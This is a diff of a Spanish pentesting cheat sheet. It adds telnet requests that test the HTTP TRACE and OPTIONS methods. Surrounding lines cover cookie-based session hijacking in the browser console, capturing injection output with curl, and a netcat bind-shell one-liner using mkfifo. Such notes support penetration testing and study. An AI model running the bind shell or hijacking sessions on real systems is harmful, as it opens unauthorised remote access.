@@ -10,6 +10,16 @@ En la consola del navegador, document.cookie="cookie que queramos usar" para hac
 
 Si introducimos la url que aparece al hacer un Command Injection o SQL Injection con --data (capturándola con Burp por ejemplo) podemos hacer curl también y redirigir la salida haciendo | tee archivo.txt
 
+// Para testear TRACE
+telnet URL 80
+TRACE / HTTP/1.1
+Host: foo.bar
+X-Header: test
+
+// Para testear OPTIONS
+telnet URL 80
+OPTIONS / HTTP/1.1
+Host: foo.bar
 
 mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe Para crear bind nc
 
